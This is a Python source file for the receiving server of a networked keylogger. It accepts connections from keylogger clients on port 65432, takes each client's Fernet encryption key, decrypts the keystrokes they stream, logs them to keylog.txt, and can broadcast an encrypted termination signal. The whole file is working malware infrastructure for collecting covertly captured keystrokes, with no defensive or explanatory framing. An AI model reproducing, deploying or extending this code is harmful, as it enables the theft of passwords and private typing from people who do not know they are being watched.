import socket
import threading
from cryptography.fernet import Fernet
import logging

LOG_FILE = 'keylog.txt'
clients = {}  # Changed to a dictionary to store client connections with their associated keys
clients_lock = threading.Lock()  # Lock to ensure thread-safe access to the clients dictionary

logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(message)s')

def handle_client(connection, client_address, fernet):
    try:
        while True:
            encrypted_data = connection.recv(1024)
            if encrypted_data:
                # Decrypt and decode the data
                data = fernet.decrypt(encrypted_data).decode()

                # Logging to file
                if data == 'Key.enter':
                    logging.info('\n')
                elif data == 'terminate':  # Termination signal
                    print(f'Termination signal received from {client_address}')
                    break
                elif len(data) == 1:
                    logging.info(data)
                else:
                    logging.info(f'[{data}]')

            else:
                print(f'Connection closed by {client_address}')
                break

    finally:
        with clients_lock:
            connection.close()
            del clients[connection]  # Remove client from the dictionary

def start_server():
    # Create a TCP/IP socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Bind the socket to the address and port
    server_address = ('0.0.0.0', 65432)  # Accept connections from any IP address
    server_socket.bind(server_address)

    # Listen for incoming connections
    server_socket.listen(5)
    print(f'Server is listening on {server_address}')

    while True:
        print('Waiting for a connection...')
        connection, client_address = server_socket.accept()
        print(f'Connection from {client_address}')

        # Receive the unique encryption key from the client
        encryption_key = connection.recv(1024)
        fernet = Fernet(encryption_key)

        with clients_lock:
            clients[connection] = fernet  # Add client connection and associated key to the dictionary

        # Start a new thread to handle the client
        client_thread = threading.Thread(target=handle_client, args=(connection, client_address, fernet))
        client_thread.start()

def stop_clients():
    # Send termination signal to all connected clients
    with clients_lock:
        for client, fernet in clients.items():
            try:
                termination_signal = fernet.encrypt('terminate'.encode())
                client.sendall(termination_signal)
                client.close()
            except Exception as e:
                print(f"Error sending termination signal: {e}")

if __name__ == '__main__':
    server_thread = threading.Thread(target=start_server)
    server_thread.start()

    print("Press 'Escape' to terminate all clients.")
    while True:
        if input() == "Escape":
            stop_clients()
            break
